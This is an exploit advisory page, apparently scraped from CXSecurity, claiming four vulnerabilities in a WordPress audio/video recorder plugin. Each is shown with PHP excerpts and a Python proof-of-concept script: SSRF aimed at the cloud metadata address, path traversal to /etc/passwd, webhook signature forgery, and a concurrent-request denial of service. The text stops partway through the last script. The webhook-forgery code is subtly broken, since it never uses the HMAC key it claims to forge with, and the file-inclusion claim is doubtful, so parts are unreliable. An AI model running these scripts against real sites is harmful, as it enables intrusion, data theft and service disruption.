---
title: WordPress Pipe Audio Video and Screen Recorder 1.0.6 - Multiple Vulnerabilities
url: https://cxsecurity.com/issue/WLB-2025040014
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-04-07
fetch_date: 2025-10-06T22:03:31.342667
---

# WordPress Pipe Audio Video and Screen Recorder 1.0.6 - Multiple Vulnerabilities

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WordPress Pipe Audio Video and Screen Recorder 1.0.6 - Multiple Vulnerabilities** **2025.04.06**  Credit:  **[bRpsd](https://cxsecurity.com/author/bRpsd/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: WordPress Pipe Audio Video and Screen Recorder 1.0.6 - Multiple Vulnerabilities
# Date: March 28, 2025
# Exploit Author: bRpsd cy[at]live.no
# Plugin Link: https://wordpress.org/plugins/pipe-audio-video-and-screen-recorder/
# Version: 1.0.6
# Tested on: MacOS local Xampp
Vulnerability1: SSRF in File Download
File:load/AddPipe.php
Function: addpipe\_handle\_download()
Vulnerable Code:
================================================================================================
public function addpipe\_handle\_download() {
// ...
$fileUrl = isset($\_POST['file']) ? esc\_url\_raw(wp\_unslash($\_POST['file'])) : '';
$allowed\_domains = ['addpipe.com'];
$parsed\_url = wp\_parse\_url($fileUrl);
if (!isset($parsed\_url['host']) || !in\_array($parsed\_url['host'], $allowed\_domains, true)) {
wp\_send\_json\_error(['message' => 'Unauthorized domain'], 403);
}
$fileContent = @file\_get\_contents($fileUrl); // SSRF here
// ...
}
================================================================================================
Vuln1 Python POC:
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
import requests
target = "http://example.com/wp-admin/admin-ajax.php"
nonce = "VALID\_NONCE\_HERE" # Replace with actual nonce
# Craft malicious URL (redirects to internal service)
malicious\_url = "https://addpipe.com/redirect?url=http://169.254.169.254/latest/meta-data"
data = {
"action": "addpipe\_download\_file",
"file": malicious\_url,
"\_wpnonce": nonce
}
response = requests.post(target, data=data)
print(f"SSRF Response ({response.status\_code}):\n{response.text[:500]}")
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Vulnerability2: LFI via Quality Parameter
File: load/AddPipe.php
Function: addpipe\_ajax\_shortcode\_generator()
Vulnerable Code:
================================================================================================
public function addpipe\_ajax\_shortcode\_generator() {
// ...
$quality = isset($\_POST['quality']) ? sanitize\_text\_field(wp\_unslash($\_POST['quality'])) : '';
$qualityurl = "avq/" . $quality . ".xml"; // LFI here
$data = [
'qualityurl' => $qualityurl,
// ...
];
// ...
}
================================================================================================
Vuln2 Python POC:
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
import requests
from urllib.parse import quote
target = "http://example.com/wp-admin/admin-ajax.php"
nonce = "VALID\_NONCE\_HERE" # Replace with actual nonce
# Directory traversal payload
lfi\_payload = quote("../../../../etc/passwd")
data = {
"action": "addpipe\_ajax\_shortcode\_generator",
"quality": lfi\_payload,
"\_wpnonce": nonce
}
response = requests.post(target, data=data)
print(f"LFI Response ({response.status\_code}):\n{response.text}")
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Vulnerability3: Webhook Signature Bypass
File: load/AddPipe.php
Function: addpipeWebhook()
Vulnerable Code:
================================================================================================
public function addpipeWebhook() {
$webhook\_url = admin\_url('admin-ajax.php?action=addpipeWebhook');
$received\_signature = $\_SERVER['HTTP\_X\_PIPE\_SIGNATURE'] ?? '';
$json\_payload = file\_get\_contents('php://input');
$data\_to\_sign = $webhook\_url . $json\_payload;
$expected\_signature = base64\_encode(hash\_hmac('sha1', $data\_to\_sign, $this->pipeWebhookKey, true));
if (!hash\_equals($expected\_signature, $received\_signature)) {
wp\_die('Unauthorized request', 403);
}
// ...
}
================================================================================================
Vuln3 Python POC:
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
import hashlib
import base64
import requests
webhook\_url = "http://example.com/wp-admin/admin-ajax.php?action=addpipeWebhook"
known\_key = "WEAK\_SECRET\_KEY" # Replace with guessed/exposed key
malicious\_payload = {
"event": "video\_recorded",
"data": {
"id": 666,
"envCode": "attacker\_env",
"videoName": "hacked\_recording"
}
}
# Generate forged signature
signature\_data = webhook\_url + str(malicious\_payload)
signature = base64.b64encode(
hashlib.sha1(signature\_data.encode()).hexdigest().encode()
).decode()
headers = {
"X-Pipe-Signature": signature,
"Content-Type": "application/json"
}
response = requests.post(webhook\_url, json=malicious\_payload, headers=headers)
print(f"Webhook Injection ({response.status\_code}): {response.text}")
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Vulnerability4: DoS via Sync Endpoint
File: load/AddPipe.php
Function: addpipe\_ajax\_sync\_deleted()
Vulnerable Code:
================================================================================================
public function addpipe\_ajax\_sync\_deleted() {
foreach ($this->addpipeGetRecordedRecordings() as $obj) {
if (!$this->addpipeIsFileOnServer($obj->recording\_url)) {
$wpdb->query("UPDATE {$wpdb->prefix}addpipe\_records SET active = 0...");
}
}
}
================================================================================================
Vuln4 POC:
import requests
from concurrent.futures import ThreadPoolExecutor
target = "http://example.com/wp-admin/admin-ajax.php"
nonce = "VALID\_ADMIN\_NONCE" # Requires admin privileges
def send\_sync\_request(\_):
data = {"action": "addpipe\_ajax\_sync\_deleted", "\_wpnonce": nonce}
response = requests.post(target, data=data)
return response.status\_code
# Launch 100 concurrent requests
with ThreadPoolExecutor(max\_workers=20) as executor:
results = list(executor.map...